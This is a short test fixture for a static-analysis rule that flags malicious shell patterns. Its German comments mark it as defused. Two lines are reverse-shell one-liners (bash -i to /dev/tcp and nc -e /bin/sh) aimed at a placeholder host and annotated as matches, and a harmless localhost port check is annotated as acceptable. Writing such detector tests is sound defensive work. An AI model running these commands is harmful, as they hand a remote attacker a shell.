# LUIBUI-TESTFIXTURE: entschärft, nicht ausführen
# ruleid: LB-C10-schadmuster-sh
bash -i >& /dev/tcp/gegenstelle.invalid/4444 0>&1
# ruleid: LB-C10-schadmuster-sh
nc -e /bin/sh gegenstelle.invalid 4444
# ok: LB-C10-schadmuster-sh
nc -z localhost 8080
